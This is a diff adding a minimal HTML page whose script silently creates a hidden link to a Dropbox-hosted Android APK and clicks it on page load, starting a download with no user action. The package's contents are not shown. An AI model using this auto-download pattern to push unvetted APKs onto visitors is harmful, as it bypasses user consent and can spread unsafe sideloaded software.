@@ -1,0 +1,23 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Downloading...</title>
+</head>
+
+<body>
+    <script>
+        // Create a hidden link element
+        const downloadLink = document.createElement('a');
+        downloadLink.href = "https://www.dropbox.com/scl/fi/zmzsqq58hjqij581jv0s5/LUXOR777_bVault.apk?rlkey=haj1ghkfwjlze7xuz6ilgkfx9&st=8kajbqar&dl=1";
+        downloadLink.download = ""; // This prompts the browser to treat it as a download
+        downloadLink.style.display = "none"; // Hide the element
+        document.body.appendChild(downloadLink);
+        downloadLink.click(); // Programmatically click to start the download
+        document.body.removeChild(downloadLink); // Clean up
+    </script>
+</body>
+
+</html>
